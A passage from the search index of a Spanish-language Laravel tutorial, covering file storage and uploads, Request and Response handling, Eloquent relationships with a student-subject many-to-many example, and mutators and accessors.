Storage::allFiles('archivos');\nprint_r($archivos);\n// Obtener s\u00f3lo los directorios\n$directorios = Storage::directories('archivos');\nprint_r($directorios);\n</code></pre>"},{"location":"09laravelAvanzado.html#crear-enlace-simbolico","title":"Crear enlace simb\u00f3lico","text":"<p>Para acceder a archivos desde el navegador mediante su ruta y poder incluirlos en las vistas, es necesario crear un enlace simb\u00f3lico en <code>/public</code> que apunte a  <code>/storage/app/public</code> (o donde mande el disco configurado). Para ello, desde la ra\u00edz del proyecto ejecuta:</p> <pre><code>php artisan storage:link\n</code></pre> <p>En <code>/public</code> se habr\u00e1 creado el enlace s\u00edmbolico storage, que en la pr\u00e1ctica es como si tuvi\u00e9semos ah\u00ed los archivos. </p>"},{"location":"09laravelAvanzado.html#ejemplo-subir-archivo","title":"Ejemplo subir archivo","text":"<p>En la vista:</p> <pre><code>&lt;form action=\"{{ route('subir.archivo') }}\" method=\"POST\" enctype=\"multipart/form-data\"&gt;\n    @csrf\n    &lt;input type=\"file\" name=\"archivo\"&gt;\n    &lt;button type=\"submit\"&gt;Subir&lt;/button&gt;\n&lt;/form&gt;\n</code></pre> <p>En el controlador:</p> <pre><code>&lt;?php\nuse Illuminate\\Http\\Request;\nuse Illuminate\\Support\\Facades\\Storage;\n\npublic function subirArchivo(Request $request) {\n    $request-&gt;validate([\n        'archivo' =&gt; 'required|file|max:2048',\n    ]);\n\n    $path = $request-&gt;file('archivo')-&gt;store('archivos');\n    return \"Archivo subido a: \" . $path;\n}\n</code></pre>"},{"location":"09laravelAvanzado.html#ejemplo-archivos-en-vistas","title":"Ejemplo archivos en vistas","text":"<p>En el controlador:</p> <pre><code>&lt;?php\npublic function muestraArchivos(){\n      $paths = Storage::disk('public')-&gt;allFiles('archivos');\n      return view('archivos.muestra', compact('paths')); \n  }\n</code></pre> <p>En la vista:</p> <pre><code>&lt;div&gt;\n  &lt;h1&gt;Listado de im\u00e1genes&lt;/h1&gt;\n  @foreach ($paths as $path)\n      &lt;p&gt;&lt;img src=\"{{ Storage::url($path) }}\" /&gt;&lt;/p&gt;\n  @endforeach\n&lt;/div&gt;\n</code></pre>"},{"location":"09laravelAvanzado.html#92-request-y-response","title":"9.2 Request y Response","text":"<p>Las peticiones y respuestas permiten interactuar con la solicitud HTTP que llega y que se devuelve, por lo que se suelen utilizar en alguna funci\u00f3n del controlador al que dirige una ruta determinada. M\u00e1s info en la documentaci\u00f3n oficial.</p>"},{"location":"09laravelAvanzado.html#request","title":"Request","text":"<p>La clase <code>Illuminate\\Http\\Request</code> de Laravel proporciona una forma orientada a objetos de interactuar con la solicitud HTTP actual que maneja la aplicaci\u00f3n, as\u00ed como tambi\u00e9n de recuperar la entrada, las cookies y los archivos que se enviaron con la solicitud.</p>"},{"location":"09laravelAvanzado.html#acceso-a-los-datos-de-la-peticion","title":"Acceso a los datos de la petici\u00f3n","text":"<p>Se pueden obtener los elementos enviados a la petici\u00f3n de diferentes formas. Recuerda que se recuperan por el campo <code>name</code> que hayas especificado en el formulario.</p> <pre><code>&lt;?php\n$input = $request-&gt;all(); //Acceder a todos los inputs\n$name = $request-&gt;input('name'); //Obtener un input espec\u00edfico\n$name = $request-&gt;name; //Obtener un input espec\u00edfico\n$age = $request-&gt;input('age', 18); //Especificar valores por defecto\n$id = $request-&gt;route('id'); //Acceder a par\u00e1metros de ruta\n</code></pre> <p>Tambi\u00e9n es posible comprobar si en la petici\u00f3n se han recibido ciertos elementos, si vienen rellenos, excluirlos...</p> <pre><code>&lt;?php\nif ($request-&gt;has('email')) {\n    // Input 'email' se ha recibido\n}\nif ($request-&gt;filled('name')) {\n    // Input 'name' no est\u00e1 vac\u00edo\n}\n$filtered = $request-&gt;only(['name', 'email']); // Filtrar inputs espec\u00edficos\n$excluded = $request-&gt;except(['password']); // Excluir ciertos inputs\n</code></pre>"},{"location":"09laravelAvanzado.html#tratamiento-de-archivos","title":"Tratamiento de archivos","text":"<p>Los archivos se tratan de forma similar.</p> <pre><code>&lt;?php\n// Comprobar si se ha recibido el archivo con name 'photo'\nif ($request-&gt;hasFile('photo')) { \n    $file = $request-&gt;file('photo');\n}\n// Almacenar el archivo en el storage configurado\n$path = $request-&gt;file('photo')-&gt;store('photos'); \n</code></pre>"},{"location":"09laravelAvanzado.html#response","title":"Response","text":"<p>Una instancia de Response hereda de la clase <code>Symfony\\Component\\HttpFoundation\\Response</code> y proporciona una variedad de m\u00e9todos para personalizar el c\u00f3digo de estado HTTP y los encabezados de la respuesta.</p>"},{"location":"09laravelAvanzado.html#crear-respuestas","title":"Crear respuestas","text":"<pre><code>&lt;?php\n// Respuesta b\u00e1sica\nreturn response('Hello World', 200); \n// Respuesta en formato JSON\nreturn response()-&gt;json([\n    'name' =&gt; 'John',\n    'status' =&gt; 'success'\n]); \n // Redirecci\u00f3n\nreturn redirect('dashboard');\n// Redicrecci\u00f3n pasando la variable 'status'\nreturn redirect('login')-&gt;with('status', 'Sesi\u00f3n iniciada'); \n</code></pre>"},{"location":"09laravelAvanzado.html#manipular-cabeceras","title":"Manipular cabeceras","text":"<pre><code>&lt;?php\n// Respuesta a\u00f1adiendo 1 cabecera\nreturn response('Hello')-&gt;header('Content-Type', 'text/plain');\n// Respuesta a\u00f1adiendo m\u00faltiples cabeceras\nreturn response('Hello')\n  -&gt;header('Content-Type', 'application/json')\n  -&gt;header('Cache-Control', 'no-cache');\n</code></pre>"},{"location":"09laravelAvanzado.html#respuestas-de-archivos","title":"Respuestas de archivos","text":"<pre><code>&lt;?php\nreturn response()-&gt;download($pathToFile); // Descarga archivo\nreturn response()-&gt;file($pathToFile); // Mostrar archivo\n</code></pre>"},{"location":"09laravelAvanzado.html#93-eloquent-relaciones","title":"9.3 Eloquent: Relaciones","text":"<p>A trav\u00e9s de Eloquent vamos a poder gestionar las relaciones entre nuestras tablas de la base de datos de una manera muy sencilla y sin sentencias SQL. M\u00e1s info sobre relaciones, como siempre, en la documentaci\u00f3n oficial.</p>"},{"location":"09laravelAvanzado.html#relaciones-en-bbdd","title":"Relaciones en BBDD","text":"<p>En una base de datos relacional, las relaciones son las conexiones entre las tablas, que se establecen a trav\u00e9s de las claves primarias y for\u00e1neas. Para obtener datos de varias tablas, podemos hacerlo de 2 formas:</p> <ul> <li>JOIN: Unir las tablas a trav\u00e9s de las claves primarias y for\u00e1neas.</li> <li>Relaciones: Definir las relaciones en los modelos, y acceder a los datos a trav\u00e9s de las relaciones.</li> </ul> <p>Las relaciones que existen en una base de datos relacional son:</p> <ul> <li>Uno a Uno: Un registro de una tabla se relaciona con un \u00fanico registro de otra tabla.</li> <li>Uno a Muchos: Un registro de una tabla se relaciona con varios registros de otra tabla.</li> <li>Muchos a Muchos: Varios registros de una tabla se relacionan con varios registros de otra tabla.</li> <li>Uno a Uno Polim\u00f3rfica: Un registro de una tabla puede relacionarse con un \u00fanico registro de varias tablas.</li> <li>Uno a Muchos Polim\u00f3rfica: Un registro de una tabla puede relacionarse con varios registros de varias tablas.</li> <li>Muchos a Muchos Polim\u00f3rfica: Varios registros de una tabla pueden relacionarse con varios registros de varias tablas.</li> </ul> <p>Nota: Relaciones polim\u00f3rficas son aquellas en las que una tabla se relaciona con varias tablas.</p>"},{"location":"09laravelAvanzado.html#relaciones-en-eloquent","title":"Relaciones en Eloquent","text":"<p>Eloquent nos permite definir las relaciones entre los modelos, y acceder a los datos a trav\u00e9s de ellas. Tipos:</p> <ul> <li>Uno a Uno: <code>hasOne()</code>, <code>belongsTo()</code></li> <li>Uno a Muchos: <code>hasMany()</code>, <code>belongsTo()</code></li> <li>Muchos a Muchos: <code>belongsToMany()</code></li> <li>Uno a Uno Polim\u00f3rfica: <code>morphOne()</code>, <code>morphTo()</code></li> <li>Uno a Muchos Polim\u00f3rfica: <code>morphMany()</code>, <code>morphTo()</code></li> <li>Muchos a Muchos Polim\u00f3rfica: <code>morphToMany()</code>, <code>morphedByMany()</code></li> </ul> <p>El m\u00e9todo a utilizar <code>hasOne()</code> o <code>belongsTo()</code> y similares depender\u00e1 de la tabla en la que se encuentre la clave for\u00e1nea. Por ejemplo, si en una aplicaci\u00f3n de Notas, la tabla notas tiene una clave for\u00e1nea user_id, est\u00e1 utilizar\u00e1 belongsTo() y la tabla usuarios, hasOne(), hasMany() o lo que corresponda.</p>"},{"location":"09laravelAvanzado.html#relacion-uno-a-uno-1-a-1","title":"Relaci\u00f3n Uno a uno (1 a 1)","text":"<p>Para crear este tipo de relaciones en Eloquent y Laravel, debemos tener creadas las tablas que vayamos a relacionar y establecer la relaci\u00f3n entre ellas a trav\u00e9s del m\u00e9todo <code>hasOne()</code> y <code>belongsTo()</code>.</p> <p>Supongamos que tenemos una tabla <code>usuario</code> que est\u00e1 relacionada con la tabla <code>telefono</code>.</p> <pre><code>&lt;?php\nnamespace App\\Models;\n\nuse Illuminate\\Database\\Eloquent\\Model;\n\nclass Usuario extends Model\n{\n  // Obtener el Tel\u00e9fono asocioado con el Usuario\n  public function telefono()\n  {\n      return $this-&gt;hasOne(Telefono::class);\n  }\n}\n</code></pre> <p>Una vez hecho \u00e9sto, para poder recuperar el dato relacionado, debemos utilizar las propiedades din\u00e1micas de Eloquent. Con estas propiedades din\u00e1micas podremos obtener dicho dato.</p> <pre><code>&lt;?php\n$telefono = Usuario::find(1)-&gt;telefono;\n</code></pre> <p>En este caso, Eloquent asume que en <code>Usuario</code> existe la clave ajena <code>usuario_id</code> pero \u00bfqu\u00e9 pasa si tenemos otro nombre? pues se lo pasamos como par\u00e1metro.</p> <pre><code>&lt;?php\nreturn $this-&gt;hasOne(Telefono::class, 'clave_ajena');\n</code></pre>"},{"location":"09laravelAvanzado.html#relacion-uno-a-uno-inversa","title":"Relaci\u00f3n Uno a Uno INVERSA","text":"<p>Ahora que podemos acceder al modelo tel\u00e9fono desde el modelo usuario, vamos a ver c\u00f3mo hacerlo de manera inversa, es decir, c\u00f3mo acceder desde el modelo <code>telefono</code> al modelo <code>usuario</code> mediante el m\u00e9todo <code>belongsTo()</code>.</p> <pre><code>&lt;?php\nnamespace App\\Models;\n\nuse Illuminate\\Database\\Eloquent\\Model;\n\nclass Telefono extends Model\n{\n  public function usuario()\n  {\n      return $this-&gt;belongsTo(Usuario::class);\n  }\n}\n</code></pre> <p>Al llamar el m\u00e9todo de <code>usuario</code>, Eloquent intentar\u00e1 encontrar un modelo Usuario que tenga un <code>id</code> que coincida con la columna de <code>usuario_id</code> en el modelo de <code>telefono</code>.</p> <p>Eloquent determina el nombre de la clave externa examinando el nombre del m\u00e9todo de relaci\u00f3n y agregando el sufijo <code>_id</code> al nombre del m\u00e9todo. Entonces, asume que el modelo <code>Telefono</code> tiene una columna <code>usuario_id</code>. Sin embargo, si no se llama de esa manera, puedes pasarle como argumento el nombre de la clave.</p> <pre><code>&lt;?php\npublic function usuario()\n{\n    return $this-&gt;belongsTo(Usuario::class, 'clave_ajena');\n}\n</code></pre>"},{"location":"09laravelAvanzado.html#relacion-uno-a-muchos-1-a-m","title":"Relaci\u00f3n Uno a Muchos (1 a M)","text":"<p>Por ejemplo, las entradas de un blog o un post tienen muchos comentarios.</p> <p>Para empezar, ya sabemos que debemos crear ambas clases del modelo y en este caso, usaremos el m\u00e9todo <code>hasMany()</code> para obtener los datos relacionados con ese post o entrada en el blog.</p> <pre><code>&lt;?php\nnamespace App\\Models;\n\nuse Illuminate\\Database\\Eloquent\\Model;\n\nclass Post extends Model\n{\n  public function comentarios()\n  {\n      return $this-&gt;hasMany(Comentario::class);\n  }\n}\n</code></pre> <p>Cuidado con las claves ajenas, que aqu\u00ed pasa lo mismo... Eloquent establece por defecto el sufijo <code>_id</code> por lo tanto, en este ejemplo buscar\u00eda por <code>post_id</code>. Si nuestra clave ajena tiene otro nombre, se lo pasamos por par\u00e1metro en el m\u00e9todo <code>hasMany</code> como hac\u00edamos m\u00e1s arriba.</p> <p>Hay que tener en cuenta que <code>hasMany</code> devuelve un array de elemento.</p> <pre><code>&lt;?php\nuse App\\Models\\Post;\n\n$comentarios = Post::find(1)-&gt;comentarios;\n\nforeach ($comentarios as $comentario) {\n    // Lo que sea que hagamos con esos datos o pasar el array directamente a la vista\n}\n</code></pre> <p>Adem\u00e1s, como todas las relaciones son sentencias SQL, podemos anidar varios filtros en funci\u00f3n de lo que queramos sacar.</p> <pre><code>$comentario = Post::find(1)-&gt;comentarios()\n    -&gt;where('titulo', 'lo que sea')\n    -&gt;first();\n</code></pre>"},{"location":"09laravelAvanzado.html#relacion-uno-a-muchos-inversa","title":"Relaci\u00f3n Uno a Muchos INVERSA","text":"<p>Ahora que podemos acceder a todos los comentarios de una publicaci\u00f3n, definamos una relaci\u00f3n para permitir que un comentario acceda a su publicaci\u00f3n principal.</p> <pre><code>&lt;?php\nnamespace App\\Models;\n\nuse Illuminate\\Database\\Eloquent\\Model;\n\nclass Comentario extends Model\n{\n  public function post()\n  {\n      return $this-&gt;belongsTo(Post::class);\n  }\n}\n</code></pre> <p>Y ahora, a trav\u00e9s de la propiedad de relaci\u00f3n din\u00e1mica...</p> <pre><code>&lt;?php\nuse App\\Models\\Comentario;\n\n$comentario = Comentario::find(1);\n\nreturn $comentario-&gt;post()-&gt;titulo;\n</code></pre> <p>Pasar\u00eda lo mismo con el nombre de la clave ajena, si no se llama de la misma manera que Eloquent establece con el sufijo <code>_id</code> podemos pasarle como par\u00e1metro el nombre de la clave donde debe buscar.</p>"},{"location":"09laravelAvanzado.html#anadireliminar-elementos-relacionados","title":"A\u00f1adir/eliminar elementos relacionados","text":"<p>En las relaciones de 1 a muchos hay varias formas de a\u00f1adir elementos relacionados:</p> <ol> <li>Asignaci\u00f3n manual mediante clave ajena.</li> <li>Asignar un un objeto existente.</li> <li>Asignar un objeto cre\u00e1ndolo.</li> </ol> <p>En el siguiente ejemplo de 1 post que tiene muchos comentarios se ven las 3 formas:</p> <pre><code>&lt;?php\n$post = new Post();\n$post-&gt;titulo = \"Fundamentos de programaci\u00f3n en Laravel\";\n$post-&gt;save();\n\n$comentario = new Comentario();\n$comentario-&gt;texto = \"Me parecen muy interesantes los conceptos tratados en el post.\";\n$comentario-&gt;autor = \"John Doe\";\n$comentario-&gt;post_id = $post-&gt;id; // Forma 1 de asignar 1 comentario a 1 post (directamente mediante su clave ajena)\n$comentario-&gt;save();\n\n// Forma 2 de asignar 1 comentario a 1 post (si ya EXISTE el comentario)\n$post-&gt;comentario()-&gt;save($comentario);\n\n// Forma 3 de asignar 1 comentario a 1 post (CREANDO del tir\u00f3n el comentario) --&gt; fillable en Comentario.php\n$post-&gt;comentario()-&gt;create([\n    'texto' =&gt; 'Me parecen muy interesantes los conceptos tratados en el post.',\n    'autor' =&gt; 'John Doe',\n]);\n</code></pre>"},{"location":"09laravelAvanzado.html#relacion-muchos-a-muchos-mm-a-mm","title":"Relaci\u00f3n Muchos a Muchos (MM a MM)","text":"<p>Este tipo de relaciones son las m\u00e1s complicadas. Por ejemplo, en un blog como Wordpress, un usuario puede tener muchos roles (lector, autor, administrador) pero un rol pueden tenerlo varios usuarios, es decir, puede haber muchos usuarios administradores, otros lectores y dem\u00e1s.</p> <p>Para realizar este tipo de relaciones necesitar\u00edamos 3 tablas diferentes.</p> <ul> <li>usuarios [id, nombre]</li> <li>roles [id, nombre]</li> <li>rol_usuario [usuario_id, rol_id] (Tabla Pivote)</li> </ul> <p>Lo primero de todo, vamos a crear las tablas con sus modelos a excepci\u00f3n de la tabla pivote rol_usuario que s\u00f3lo crearemos la tabla, sin su modelo</p> <pre><code>php artisan make:migration create_rol_usuario_table --create=rol_usuario\n</code></pre> <p>Y la estructura de dicha tabla quedar\u00eda:</p> <pre><code>&lt;?php\n\npublic function up()\n{\n    Schema::create('rol_usuario', function (Blueprint $table) {\n        $table-&gt;bigIncrements('id'); // creates an auto-incrementing UNSIGNED BIGINT (primary key) equivalent column\n        $table-&gt;unsignedInteger('usuario_id');\n        $table-&gt;unsignedInteger('rol_id');\n        $table-&gt;timestamps();\n\n        // Tambi\u00e9n se pod\u00edan haber definido como cl\u00e1ves for\u00e1neas\n        // $table-&gt;foreignId('usuario_id')-&gt;constrained('usuarios');\n        // $table-&gt;foreignId('rol_id')-&gt;constrained('rols'); // Ojo con el nombre\n    });\n}\n</code></pre> <p>Ahora que ya tenemos todo listo, las relaciones de Muchos a Muchos vienen definidas por un m\u00e9todo que devuelve el resultado de usar el m\u00e9todo <code>belongsToMany()</code></p> <pre><code>&lt;?php\nnamespace App\\Models;\n\nuse Illuminate\\Database\\Eloquent\\Model;\n\nclass Usuario extends Model\n{\n    public function roles()\n    {\n        return $this-&gt;belongsToMany(Rol::class, 'rol_usuario');\n    }\n}\n</code></pre> <p>Como 2\u00ba par\u00e1metro de <code>belongsToMany</code> se puede indicar la tabla intermedia de la relaci\u00f3n <code>rol_usuario</code>. \u00datil, si se utiliza un nombre que Laravel no puede deducir a partir de los modelos.</p> <p>Una vez que tengamos las relaciones definidas, accederemos a ellas mediante las propiedades din\u00e1micas de <code>roles</code>.</p> <pre><code>&lt;?php\n\nuse App\\Models\\Usuario;\n\n$usuario = Usuario::find(1);\n\nforeach ($usuario-&gt;roles as $rol) {\n    // nuestro c\u00f3digo\n}\n</code></pre> <p>Acordaros que podemos encadenar comandos sql a trav\u00e9s de los m\u00e9todos de Eloquent</p> <pre><code>&lt;?php\n$roles = Usuario::find(1)-&gt;roles()-&gt;orderBy('nombre')-&gt;get();\n</code></pre>"},{"location":"09laravelAvanzado.html#relacion-muchos-a-muchos-inversa","title":"Relaci\u00f3n Muchos a Muchos INVERSA","text":"<p>Para definir la parte \"inversa\" de una relaci\u00f3n de muchos a muchos, debemos establecer un m\u00e9todo en el modelo relacionado que tambi\u00e9n devuelva el resultado del m\u00e9todo <code>belongsToMany</code>. En este caso, se hace exactamente igual en ambas partes de la relaci\u00f3n. Seg\u00fan el ejemplo que estamos siguiendo:</p> <pre><code>&lt;?php\n\nnamespace App\\Models;\n\nuse Illuminate\\Database\\Eloquent\\Model;\n\nclass Rol extends Model\n{\n  public function usuarios()\n  {\n      return $this-&gt;belongsToMany(Usuario::class, 'rol_usuario');\n  }\n}\n</code></pre>"},{"location":"09laravelAvanzado.html#anadireliminar-elementos-a-la-tabla-pivote","title":"A\u00f1adir/eliminar elementos a la tabla pivote","text":"<p>Laravel proporciona una serie de m\u00e9todos para a\u00f1adir/eliminar elementos a la tabla pivote en las relaciones de Muchos a Muchos. Estos son:</p> <ul> <li><code>attach()</code>: A\u00f1ade a la tabla pivote los elementos pasados.</li> <li><code>detach()</code>: Elimina de la tabla pivote los elementos pasados.</li> <li><code>toggle()</code>: A\u00f1ade un elemento si no existe, y lo elimina si ya existe.</li> <li><code>sync()</code>: Deja en la tabla pivote s\u00f3lo los elementos que se le pasen.</li> </ul> <p>Los m\u00e9todos anteriores admiten un \u00fanico id, un array de ids o el propio objeto. Ejemplos:</p> <pre><code>&lt;?php\n  use App\\Models\\Usuario;\n  use App\\Models\\Rol;\n\n  // Recuperar usuario con id 1\n  $usuario = Usuario::find(1);\n\n  // A\u00f1adirle roles por sus ids\n  $usuario-&gt;roles()-&gt;attach([1, 2, 3]);\n\n  // Quitarle roles por sus ids\n  $usuario-&gt;roles()-&gt;detach(2);\n\n  // Elimina el 1 (ya exist\u00eda) y a\u00f1ade el 2 (no exist\u00eda)\n  $usuario-&gt;roles()-&gt;toggle([1, 2]);\n\n  // Sincroniza con los elementos pasados (s\u00f3lo deja estos en la tabla pivote)\n  $usuario-&gt;roles()-&gt;sync([1, 3]);\n\n  // Tambi\u00e9n se pueden releacionar mediante el propio objeto\n  $rol = Rol::find(1);\n  $usuario-&gt;roles()-&gt;attach($rol); // En este caso da error porque ya tiene dicho rol (1)\n</code></pre>"},{"location":"09laravelAvanzado.html#relaciones-transitivas","title":"Relaciones transitivas","text":"<p>Las relaciones transitivas Has One Through y Has Many Through nos permiten una forma de acceder a tablas lejanas, que no est\u00e1n directamente relacionadas entre s\u00ed. Por ejemplo, Un Editor tiene muchos Post, y un Post tiene muchos Comment. Si queremos acceder a los Comment de un Editor, podemos hacerlo a trav\u00e9s de la relaci\u00f3n Has Many Through.</p> <pre><code>&lt;?php\n\nnamespace App\\Models;\n\nuse Illuminate\\Database\\Eloquent\\Model;\n\nclass Editor extends Model\n{\n  public function comments()\n  {\n      return $this-&gt;hasManyThrough(Comment::class, Post::Class);\n  }\n}\n</code></pre>"},{"location":"09laravelAvanzado.html#ejemplo-completo","title":"Ejemplo completo","text":"<p>Vamos a hacer un ejemplo con una APP que gestione alumnos y asignaturas, de tal manera que muchos alumnos pueden cursar muchas asignaturas.</p> <p>\u00bfQu\u00e9 necesitamos para este ejemplo?</p> <ul> <li>2 modelos:  <code>Alumno</code> y <code>Materia</code>.</li> <li>3 migraciones para crear las tablas: <code>alumnos</code>, <code>materias</code> y <code>alumno_materia</code> (tabla pivote).</li> <li>Modificar los archivos de las migraciones <code>create_alumnos_table</code> y <code>create_materias_table</code> a\u00f1adiendo los campos que se necesiten.</li> <li>Ejecutar las migraciones.</li> <li>Rellenar la base de datos con alguna informaci\u00f3n de prueba.</li> <li>M\u00e9todo dentro de <code>Alumno</code> para crear la relaci\u00f3n Alumno-&gt;Materia.</li> <li>M\u00e9todo dentro de <code>Materia</code> para crear la relaci\u00f3n Materia-&gt;Alumno. </li> <li>Crear las rutas necesarias para ambas peticiones.</li> <li>Crear las funciones necesarias en los controladores que redirijan a la vistas.</li> <li>Crear las vistas.</li> </ul>"},{"location":"09laravelAvanzado.html#1-crear-los-modelos","title":"1. Crear los modelos","text":"<pre><code>php artisan make:model Alumno\nphp artisan make:model Materia\n</code></pre>"},{"location":"09laravelAvanzado.html#2-crear-las-3-migraciones","title":"2. Crear las 3 migraciones","text":"<pre><code>php artisan make:migration create_alumnos_table --create=alumnos\nphp artisan make:migration create_materias_table --create=materias\nphp artisan make:migration create_alumno_materia_table --create=alumno_materia\n</code></pre>"},{"location":"09laravelAvanzado.html#3-modificar-las-migraciones","title":"3. Modificar las migraciones","text":"create_alumnos_table.phpcreate_materias_table.phpcreate_alumno_materia_table.php <pre><code>&lt;?php\n\npublic function up()\n{\n  Schema::create('alumnos', function (Blueprint $table) {\n    $table-&gt;id();\n    $table-&gt;string('nombre');\n    $table-&gt;timestamps();\n  });\n}\n</code></pre> <pre><code>&lt;?php\n\npublic function up()\n{\n  Schema::create('materias', function (Blueprint $table) {\n    $table-&gt;id();\n    $table-&gt;string('nombre');\n    $table-&gt;timestamps();\n  });\n}\n</code></pre> <pre><code>&lt;?php\n\npublic function up()\n{\n  Schema::create('alumno_materia', function (Blueprint $table) {\n    $table-&gt;id();\n\n    $table-&gt;foreignId('alumno_id')\n      -&gt;nullable()\n      -&gt;constrained('alumnos')\n      -&gt;cascadeOnUpdate()\n      -&gt;nullOnDelete();\n\n    $table-&gt;foreignId('materia_id')\n      -&gt;nullable()\n      -&gt;constrained('materias')\n      -&gt;cascadeOnUpdate()\n      -&gt;nullOnDelete();\n\n    $table-&gt;timestamps();\n  });\n}\n</code></pre>"},{"location":"09laravelAvanzado.html#4-ejecutar-las-migraciones","title":"4. Ejecutar las migraciones","text":"<p>Lanzar las migraciones para que se creen las tablas en la BDD. Rellenar con alguna informaci\u00f3n de prueba.</p> <pre><code>php artisan migrate\n</code></pre>"},{"location":"09laravelAvanzado.html#5-rellenar-la-bdd-con-datos-de-prueba","title":"5. Rellenar la BDD con datos de prueba","text":"<p>Crear varios datos de prueba insertando por ejemplo, los siguientes registros mediante sentencias SQL.</p> Tabla AlumnosTabla MateriasTabla Alumno_Materia <pre><code>  INSERT INTO alumnos (`nombre`) VALUES\n    ('Antonio'),\n    ('Laura'),\n    ('Marta'),\n    ('Pedro');\n</code></pre> <pre><code>  INSERT INTO materias (`nombre`) VALUES\n    ('Programacion'),\n    ('Interfaces'),\n    ('JavaScript'),\n    ('Sistemas');\n</code></pre> <pre><code>  INSERT INTO alumno_materia (`alumno_id`, `materia_id`) VALUES\n    (1, 2),\n    (1, 4),\n    (3, 2),\n    (3, 1),\n    (2, 3),\n    (2, 4),\n    (4, 4),\n    (4, 1);\n</code></pre>"},{"location":"09laravelAvanzado.html#6-relacion-alumno-materia","title":"6. Relaci\u00f3n Alumno&lt;-&gt;Materia","text":"<p>En otro tipo de relaciones se pod\u00eda indicar la clave ajena, en esta se indica la tabla intermedia de la relaci\u00f3n <code>alumno_materia</code>.</p> Alumno.phpMateria.php <pre><code>&lt;?php\npublic function materias() {\n  return $this-&gt;belongsToMany(Materia::class, 'alumno_materia');\n}\n</code></pre> <pre><code>&lt;?php\npublic function alumnos() {\n  return $this-&gt;belongsToMany(Alumno::class, 'alumno_materia');\n}\n</code></pre>"},{"location":"09laravelAvanzado.html#7-crear-las-rutas","title":"7. Crear las rutas","text":"<p>Vamos a crear las rutas para que dado el id de un alumno pasado por par\u00e1metro, devuelva un listado de sus asignaturas y viceversa.</p> web.php <pre><code>&lt;?php\n  use App\\Http\\Controllers\\RelacionController;\n  use Illuminate\\Support\\Facades\\Route;\n\n  Route::get('alumnos/{id}/materias', [AlumnoController::class, 'materias']);\n</code></pre> <p>Haz t\u00fa la ruta, para que dado el id de una asignatura pasada por par\u00e1metro, devuelva un listado de los alumnos que la cursan.</p>"},{"location":"09laravelAvanzado.html#8-crear-el-controlador","title":"8. Crear el controlador","text":"<p>Necesitamos controladores para redireccionar las rutas a las vistas que nosotros queramos, para ello empezamos creando el controlador <code>AlumnoController</code>.</p> <pre><code>php artisan make:controller AlumnoController\n</code></pre> AlumnoController.php <pre><code>&lt;?php\n  namespace App\\Http\\Controllers;\n\n  use App\\Models\\Alumno;\n  use Illuminate\\Http\\Request;\n\n  class AlumnoController extends Controller\n  {\n    public function materias(string $id) {\n      $materias = Alumno::find($id)-&gt;materias;\n\n      return view('alumnos.materias', compact('materias'));\n    }\n  }\n</code></pre> <p>Haz t\u00fa ahora el controlador <code>MateriaController</code> con su funci\u00f3n correspondiente para devolver a los alumnos que cursen una materia determinada.</p>"},{"location":"09laravelAvanzado.html#9-crear-la-vista","title":"9. Crear la vista","text":"<p>Vamos a crar la vista que liste las materias de un usuario. Para ello creamos el archivo <code>alumnos/materias.blade.php</code>.</p> <pre><code>``` html\n&lt;div class=\"row justify-content-center\"&gt;\n  &lt;div class=\"col-auto\"&gt;\n    &lt;h3&gt;Las materias que est\u00e1 cursando el alumno son:&lt;/h3&gt;\n\n    &lt;table class=\"table table-striped table-hover\"&gt;\n      &lt;thead class=\"bg-primary text-white\"&gt;\n        &lt;th&gt;MATERIAS&lt;/th&gt;\n      &lt;/thead&gt;\n\n      &lt;tbody&gt;\n        @foreach ($materias as $materia)\n          &lt;tr&gt;\n            &lt;td&gt;\n                {{ $materia-&gt;nombre }}\n             &lt;/td&gt;\n          &lt;/tr&gt;\n        @endforeach\n      &lt;/tbody&gt;\n    &lt;/table&gt;\n  &lt;/div&gt;\n&lt;/div&gt;\n```\n</code></pre> <p>\u00bfY si quisi\u00e9ramos adem\u00e1s dar informaci\u00f3n del propio alumno? Como su nombre por ejemplo, \u00bfqu\u00e9 m\u00e1s tendr\u00edas que pasar a la vista?</p> <p>Haz t\u00fa ahora la vista correspondiente a los alumnos que cursan una determinada materia en el archivo <code>materias/alumnos.blade.php</code>.</p>"},{"location":"09laravelAvanzado.html#94-mutadores-y-accesores","title":"9.4 Mutadores y accesores","text":"<p>Los mutatores permiten transformar datos antes de guardarlos y los accesores los transforman al recuperarlos.</p> <p>Ejemplo sobre el atributo <code>password</code> definido como <code>string</code> en la migraci\u00f3n:</p> <ul> <li>El mutador (set) encripta la contrase\u00f1a con bcrypt().</li> <li>El accesor (get) devuelve \"**\" para ocultar la contrase\u00f1a al acceder al modelo.</li> </ul> <p>Y otro ejemplo m\u00e1s \u00fatil sobre el atributo <code>preferencias</code>, un array asociativo con el listado de preferencias del usuario. Como el tipo de dato <code>array</code> no existe, se define como <code>json</code> en la migraci\u00f3n (tambi\u00e9n valdr\u00eda <code>text</code>) y mediante el mutador y accesor lo transformamos:</p> <ul> <li>El mutador (set) trata el array asociativo de PHP como un objeto JSON que codifica a un string (listo para almacenar en la BDD).</li> <li>El accesor (get) decodifica el string a un objeto JSON accesible como array asociativo de PHP.</li> </ul> <pre><code>&lt;?php\nuse Illuminate\\Database\\Eloquent\\Casts\\Attribute;\nuse Illuminate\\Database\\Eloquent\\Model;\n\nclass User extends Model\n{\n    // Atributo 'password\u222b' para usar con mutador (set) y accesor (get)\n    protected function password(): Attribute\n    {\n        return Attribute::make(\n            get: fn ($value) =&gt; '********', // Oculta la contrase\u00f1a al acceder\n            set: fn ($value) =&gt; bcrypt($value), // Encripta al guardar\n        );\n    }\n\n    // Atributo 'preferencias' para usar con mutador (set) y accesor (get)\n    protected function preferencias(): Attribute{\n\n      return Attribute::make(\n          get: fn ($value) =&gt; json_decode($value, true), // Accesor: Devuelve preferencias como array PHP (true para indicar que es asociativo)\n          set: fn ($value) =&gt; json_encode($value, JSON_UNESCAPED_UNICODE),  // Mutador: Transforma el array de preferencias a objeto JSON que almacena como string\n      );\n    }\n}\n</code></pre> <p>Uso:</p> <pre><code>&lt;?php\n$user = new User();\n\n// Establecemos la contrase\u00f1a (Laravel la encripta autom\u00e1ticamente)\n$user-&gt;password = 'mi_contrase\u00f1a_segura';\necho $user-&gt;password; // Salida: ******** (accesor oculta el valor)\n\n// Internamente 'preferencias' guarda un JSON o string, pero se le asigna o recupera un array asociativo\n$user-&gt;preferencias = [\"tema\" =&gt; \"claro\", \"idioma\" =&gt; \"ES\", \"mobile\" =&gt; true, \"size\" =&gt; 12];\ndd($user-&gt;preferencias); \n/* Salida: array:4 [\u25bc \n  \"tema\" =&gt; \"claro\"\n  \"idioma\" =&gt; \"ES\"\n  